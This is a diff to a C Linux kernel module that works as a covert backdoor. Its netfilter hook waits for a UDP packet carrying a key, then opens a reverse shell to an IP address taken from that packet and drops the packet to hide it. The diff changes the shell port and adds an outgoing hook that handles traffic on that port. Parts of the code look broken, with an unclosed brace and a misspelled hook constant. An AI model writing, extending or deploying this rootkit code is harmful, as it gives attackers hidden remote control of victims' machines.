@@ -1,9 +1,10 @@
 #include "exec.c"
 
 const char* KEY = "POET";
-const char* PORT = "5858";
+const char* PORT = "7337"; 
+const int nPORT = 7337;
 
-static unsigned int my_nf_hookfn(void *priv,
+static unsigned int my_nf_hookIn(void *priv,
               struct sk_buff *skb,
               const struct nf_hook_state *state)
 {
@@ -30,7 +31,6 @@ static unsigned int my_nf_hookfn(void *priv,
         return NF_ACCEPT;
     }
 
-    //Backdoor trigger: udp
     if(ip_header->protocol==IPPROTO_UDP)
     { 
         unsigned int dport;
@@ -74,6 +74,8 @@ static unsigned int my_nf_hookfn(void *priv,
             start_reverse_shell(revIP, PORT);
             printk(KERN_INFO "successful compare and %s\n", revIP);
 
+            shSpawned = 1;
+
             kfree(revIP);
             return NF_DROP;
         }
@@ -84,9 +86,53 @@ static unsigned int my_nf_hookfn(void *priv,
     return NF_ACCEPT;
 }
 
-struct nf_hook_ops my_nfho = {
-      .hook        = my_nf_hookfn,
+
+static unsigned int my_nf_hookOut(void *priv,
+              struct sk_buff *skb,
+              const struct nf_hook_state *state)
+{
+    struct iphdr *ip_header;        //ip header
+    struct tcphdr *tcp_header;      //tcp header
+    struct sk_buff *sock_buff = skb;//sock buffer
+    char *user_data;       //data header pointer
+    //Auxiliar
+    int size;                       //payload size
+    char* _data;
+    struct tcphdr _tcphdr;
+    struct iphdr _iph;
+    char ip_source[16];
+
+    if (!sock_buff){
+        return NF_ACCEPT; //socket buffer empty
+    }
+    
+    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
+    if (!ip_header){
+        return NF_ACCEPT;
+    }
+
+    if(ip_header->protocol==IPPROTO_TCP){ 
+        unsigned int dport;
+
+        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
+
+        dport = htons((unsigned short int) tcp_header->dest);
+        if(dport == nPORT){
+            return NF_ACCEPT; 
+        }
+        return NF_QUEUE;
+}
+
+struct nf_hook_ops my_nfin = {
+      .hook        = my_nf_hookIn,
       .hooknum     = NF_INET_PRE_ROUTING,
+      .pf          = PF_INET,
+      .priority    = NF_IP_PRI_FIRST
+};
+
+struct nf_hook_ops my_nfout = {
+      .hook        = my_nf_hookOut,
+      .hooknum     = NF_INIT_LOCAL_OUT,
       .pf          = PF_INET,
       .priority    = NF_IP_PRI_FIRST
 };
